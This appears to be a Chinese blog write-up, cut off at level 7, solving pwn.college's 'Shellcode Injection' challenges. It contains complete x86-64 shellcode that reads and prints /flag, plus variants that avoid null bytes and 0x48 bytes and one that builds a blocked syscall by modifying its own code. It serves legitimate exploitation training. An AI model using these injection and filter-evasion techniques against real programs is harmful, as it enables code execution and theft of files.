@@ -1,0 +1,762 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Pi.png">
+  <link rel="icon" href="/img/Pi.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Lobo Q1ng">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Shellcode Injection这个模块，使用的不是as和ld来汇编链接了。而是使用gcc编译器。 gcc是更高级的编译器，更方便，gcc可以自动处理汇编代码。可以根据文件的后缀名自动选择相应的编译器和链接器。gcc可以自动链接标准库以及你指定的其他库。 as+ld更底层，as汇编器将汇编代码转换为目标代码。目标代码是机器可以理解的二进制代码，但还没有链接成可执行文件。ld是GNU链接器，它">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn.college: Shellcode Injection">
+<meta property="og:url" content="https://loboq1ng.github.io/2025/02/25/pwn-college-Shellcode-Injection/index.html">
+<meta property="og:site_name" content="Q1ng&#39;s blog">
+<meta property="og:description" content="Shellcode Injection这个模块，使用的不是as和ld来汇编链接了。而是使用gcc编译器。 gcc是更高级的编译器，更方便，gcc可以自动处理汇编代码。可以根据文件的后缀名自动选择相应的编译器和链接器。gcc可以自动链接标准库以及你指定的其他库。 as+ld更底层，as汇编器将汇编代码转换为目标代码。目标代码是机器可以理解的二进制代码，但还没有链接成可执行文件。ld是GNU链接器，它">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-25T08:42:30.000Z">
+<meta property="article:modified_time" content="2025-05-11T08:56:17.489Z">
+<meta property="article:author" content="Lobo Q1ng">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>pwn.college: Shellcode Injection - Q1ng&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"loboq1ng.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 80vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Q1ng&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Townscaper.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn.college: Shellcode Injection"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-25 16:42" pubdate>
+          2025年2月25日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pwn.college: Shellcode Injection</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode Injection</h3><p>这个模块，使用的不是as和ld来汇编链接了。而是使用gcc编译器。</p>
+<p>gcc是更高级的编译器，更方便，gcc可以自动处理汇编代码。可以根据文件的后缀名自动选择相应的编译器和链接器。gcc可以自动链接标准库以及你指定的其他库。</p>
+<p>as+ld更底层，as汇编器将汇编代码转换为目标代码。目标代码是机器可以理解的二进制代码，但还没有链接成可执行文件。ld是GNU链接器，它将多个目标代码文件链接成可执行文件。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">$ gcc -nostdlib -static <span class="hljs-keyword">shellcode.s </span>-o <span class="hljs-keyword">shellcode-elf </span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>nostdlib</code>：不链接标准C库(libc)。这意味着不依赖于标准库中的任何函数，例如<code>prinft</code>，<code>malloc</code>等。</p>
+<p><code>-static</code>：这个选项告诉编译器静态链接所有的库函数。所有的库函数代码将被直接包含到最终的可执行文件中，而不是通过动态链接的方式在运行时加载。提高程序可移植性。</p>
+</blockquote>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ objcopy <span class="hljs-params">--dump-section</span> <span class="hljs-string">.text=shellcode-raw</span> shellcode-elf<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>为什么需要objcopy这个命令呢？</p>
+<p>objcopy将编译出来的shellcode-elf中单纯代码部分的机器码给提取出来。如果不这样做的话，gcc编译出来的可执行文件会有其他的机器码，用这个可执行文件作为shellcode传给程序的话，就不能直接起作用了，有其他杂项。</p>
+</blockquote>
+<h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>目的是通过shellcode，读取flag，并将其打印在屏幕上。OK，使用open和sendfile系统调用即可。</p>
+<p><code>sys_sendfile(int out_fd,int in_fd,off_t *offset,size_t count)</code></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>	<span class="hljs-keyword">nop</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span>			# <span class="hljs-string">&quot;/flag&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span>						# /flag<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span>							# read only<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>							# 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span>							# 标准输出<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span>						# /flag的fd<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>							# offset <span class="hljs-number">0</span>,从第一个字符开始打印<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span>						# 输出长度<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span>							# 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>
+
+<p>其实，也可以使用read,write系统调用，但是更复杂，需要处理字符串。</p>
+<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>这关简单，用到之前的技巧，生成0x800个nop即可。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x800</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>这一关，需要shellcode中没有空字节。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mov</span> rbx, <span class="hljs-number">0</span>x67616c662f		# bb48    <span class="hljs-number">662</span>f    <span class="hljs-number">616</span>c    <span class="hljs-number">0067</span>    <span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure>
+
+<p>第一句就会有很多空字节，那么可以这么写：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x67616c66</span><br><span class="hljs-keyword">shl</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">8</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0x2f</span><br># 66bb    616c    <span class="hljs-number">4867</span>    e3c1    b308    532f<br></code></pre></td></tr></table></figure>
+
+<p><code>hexdump -x ./shellcode-raw</code>来查看shellcode的机器码。</p>
+<p>因此，其他的也相应进行替换。最终exp如下：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x67616c662f</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x67616c66</span><br>    <span class="hljs-keyword">shl</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0x2f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">shl</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0xe8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p>This challenge requires that your shellcode have no H bytes! 不给有H字节。也就是<code>48</code></p>
+<p>那就将所有的内容都换成<code>push/pop</code>即可。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x67616c662f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x616c662f</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">0x67</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x2</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x1</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">r10</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">40</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">60</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><p>不让用<code>syscall(0x0f05)</code>，<code>sysenter(0x0f34)</code>和<code>int(0x80cd)</code></p>
+<p>题目提示是：绕过的一种方法是让shellcode修改自己，以便在运行时插入<code>syscall</code>指令。</p>
+<blockquote>
+<p>那么实际操作起来就是，将syscall的0x0f05成为一个字节值，即将0x0e05作为一个字节存储于代码段中，然后通过inc指令加1，使得第一个字节0e变成0f，并执行这个机器码，成功调用syscall即可。</p>
+</blockquote>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span>			# <span class="hljs-string">&quot;/flag&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span>						# /flag<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span>							# read only<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>							# 系统调用号<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rip</span>]<br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x0e</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x05</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span>							# 标准输出<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span>						# /flag的fd<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>							# offset <span class="hljs-number">0</span>,从第一个字符开始打印<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span>						# 输出长度<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span>							# 系统调用号<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rip</span>]<br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x0e</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x05</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rip</span>]<br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x0e</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x05</span><br><br><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>gcc -Wl,-N --static -nostdlib -o shellcode-elf shellcode.s</code></p>
+<p>要记住编译时需要使用这些参数，以保证.text段是可写的，因此才能修改.byte 0x0e.</p>
+</blockquote>
+<h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h4><p>前4096个字节不给写的权限，那我直接填充这4MB的空间即可。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-meta">.rept</span> <span class="hljs-number">0x1000</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-meta">.endr</span><br></code></pre></td></tr></table></figure>
+
+<p>nop填充即可。</p>
+<h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h4><p>不给输出了现在，那么通过shellcode创建一个文件，然后把flag写进去就好啦。</p>
